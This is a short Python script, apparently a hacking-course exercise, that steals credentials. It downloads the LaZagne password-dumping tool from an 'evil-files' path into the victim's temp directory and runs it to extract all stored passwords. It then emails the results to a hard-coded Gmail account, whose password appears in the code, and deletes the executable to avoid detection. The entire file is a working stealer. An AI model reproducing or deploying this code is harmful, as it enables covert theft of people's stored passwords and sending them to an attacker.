#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)  # sends get request for URL that we passed and returns it to variable we made
    file_name = url.split("/")[-1]  # creating file name that is equal to last element of url
    with open(file_name, "wb") as out_file:  # creates a file in the working directory w/ a reference that helps us return to the file
        out_file.write(get_response.content)  # writes it in the file

def send_mail(email, password, message):  # takes email passwrod and message as inputs
    server = smtplib.SMTP("smtp.gmail.com", 587)  # creates server variable that is an instance of an smtp server using the smtplibrabry
    # specifyin the server we want to use (google) and the port (googles is 587)
    server.starttls()  # initating tls connectioon
    server.login(email, password)  # login
    server.sendmail(email, email, message)  # send an email to ourselves with the message
    server.quit()   # quit the server


temp_directory = tempfile.gettempdir()  #finds the temp dir location (a place whe0re the victim won't be looking)
os.chdir(temp_directory)  # sets the directory to the temp dir locations
download("https://10.0.2.15/evil-files/laZagne_x64.exe")
result = subprocess.check_output("laZagne_x64.exe all", shell=True)  # exectues command and returns the result
send_mail("master.miyagi.az@gmail.com", "krebs are number 1", result)  # sends the email w/ the message
os.remove("laZagne_x64.exe")  # deletes the file to avoid suspicion